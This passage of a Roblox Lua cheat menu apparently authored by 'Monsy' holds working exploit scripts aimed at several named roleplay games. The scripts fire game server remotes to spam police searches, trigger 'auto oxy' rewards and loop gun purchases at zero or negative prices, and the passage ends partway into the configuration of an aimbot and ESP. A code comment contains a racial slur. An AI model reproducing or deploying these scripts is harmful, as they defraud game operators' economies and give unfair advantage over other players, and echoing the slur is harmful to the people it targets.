--// REMOTE
local SearchRemote = ReplicatedStorage:WaitForChild("Police"):WaitForChild("Search")

--// MAIN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = ""

--// PLAYER LIST FRAME
local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 180, 0, 400)
ListFrame.Position = UDim2.new(0, 10, 0.5, -200)
ListFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
ListFrame.BorderSizePixel = 0
ListFrame.Parent = ScreenGui

Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 12)

local ListTitle = Instance.new("TextLabel")
ListTitle.Text = "PLAYERS ONLINE"
ListTitle.Font = Enum.Font.Roboto
ListTitle.TextSize = 16
ListTitle.TextColor3 = Color3.fromRGB(0,0,0)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 35)
ListTitle.Parent = ListFrame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, -10, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.Parent = ListFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 4)
UIListLayout.Parent = ScrollingFrame

--// ADD PLAYER BUTTON
local playerButtons = {}

local function addPlayerToList(player)
	if playerButtons[player] then return end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 35)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	btn.TextColor3 = Color3.fromRGB(0,0,0)
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 14
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Parent = ScrollingFrame

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 10)
	padding.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if player.Character then
			SearchRemote:FireServer(player.Character)
		end
	end)

	playerButtons[player] = btn
end

local function removePlayerFromList(player)
	if playerButtons[player] then
		playerButtons[player]:Destroy()
		playerButtons[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	addPlayerToList(player)
end

Players.PlayerAdded:Connect(addPlayerToList)
Players.PlayerRemoving:Connect(removePlayerFromList)

print("MONSY")

--// 🔥 KEYBIND: PRESS P TO SHOW/HIDE
local open = true

UIS.InputBegan:Connect(function(key, typing)
	if typing then return end
	if key.KeyCode == Enum.KeyCode.P then
		open = not open
		ListFrame.Visible = open
	end
end)
end)

addMainMenuButton("PRESTIGE ROLEPLAY AUTO OXY (MONSY)", function()
		local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 230, 0, 110)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(0,0,0)
oxyButton.Font = Enum.Font.Roboto
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

addMainMenuButton("LOS SANTOS ROLEPLAY SPAWN GUN (MONSY)", function()
		--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "LOS SANTOS ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {".50", ".50"},
    {"Normal Pistol", "Normal Pistol"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.UwUCafeFolder.BuyTool:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(2)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("LOS SANTOS ROLEPLAY AUTO OXY (MONSY)", function()
			local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 230, 0, 110)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(0,0,0)
oxyButton.Font = Enum.Font.Roboto
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

addMainMenuButton("MAHARLIKA ROLEPLAY SPAWN GUN (MONSY)", function()
			--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "MAHARLIKA ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Glock-17", "Glock-17"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(2)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("SOUTH CENTRAL ROLEPLAY SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "SOUTH CENTRAL ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Glock-17", "Glock-17"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(2)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("LUCIO CITY ROLEPLAY SPAWN GUN (MONSY)", function()
		--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "LUCIO ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"SP", "SP"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(2)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("CITY OF LAGUNA SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "CITY OF LAGUNA"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Silencer Pistolz", "Silencer Pistolz"},
    {"// @ Monsy", "// @ Monsy"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.LoadingScreenEvent:FireServer(selectedItem, 1)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(2)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("AIMBOT FOR ALL CITY / GAMES (MONSY)", function()
    local HyperEscape = { -- fuck Off I Like It, Even Tho It Is Anoying.
		GUI = {
			GUIButton = true;
			GUIToggleKey = Enum.KeyCode.RightShift;
		};

		AimBot = { -- Same Targeting System Just Sticky Aim Now.
			Enabled = false; -- No Need To Change Anything Here As It Is On The GUI

			TeamCheck = false;
			WallCheck = false;

			-- NEW
			StickyAim = false; -- This Will Stick To The Same Target.
			Prediction = false; -- I Will Make Ajustable When People Complain About It.
			PredictionAmmount = 1;

			UseMouse = true;
			MouseBind = "MouseButton2";
			Keybind = Enum.KeyCode.E;  

			ShowFov = false;
			Fov = 240;

			Smoothing = 0.3;

			AimPart = "Head";

			Thickness = 1;
			FovFillColor = Color3.fromRGB(100,0,100);
			FovColor = Color3.fromRGB(100,0,100);
			FovFillTransparency = 1;
			FovTransparenct = 0;

			IsAimKeyDown = false; -- Don't Touch Anything Here Niggas 
			Target = nil;
			CameraTween = nil;
		};

		esp = {
			Enabled = false;
			TeamCheck = false;
			
			MaxDistance = 4000;
			
			CharacterSize = Vector2.new(5,6);
			
			Box = {
				Box = false;
				Name = false;
				Distance = false;
				Health = false; -- This Is Text
				HealthBar = false;

				Color = Color3.fromRGB(255, 255, 255);

				Outline = false;
				OutlineColor = Color3.fromRGB(0,0,0);	
			};

			Tracer = {
				TeamColor = false;

				Tracer = false;
				Color = Color3.fromRGB(255, 255, 255);

				Outline = false;
				OutlineColor = Color3.fromRGB(0, 0, 0);
			};

			Hilights = { -- TODO: Arsenal 

				Hilights = false;

				AllWaysVisible = false;			

				OutlineTransparency = 0.5;
				FillTransparency = 0.5;

				OutlineColor = Color3.fromRGB(255, 0, 0);
				FillColor = Color3.fromRGB(255, 255, 255);
			};
		};
	};

	local players = game.Players;
	local localPlayer = players.LocalPlayer;
	local CurrentCamera = game.Workspace.CurrentCamera;
	local TweenService = game.TweenService;
	local UIS = game.UserInputService;
	local mouseLocation = UIS.GetMouseLocation;
	local CoreGui = game:FindFirstChild("CoreGui");

	function library()
		local library = { 
			flags = { };
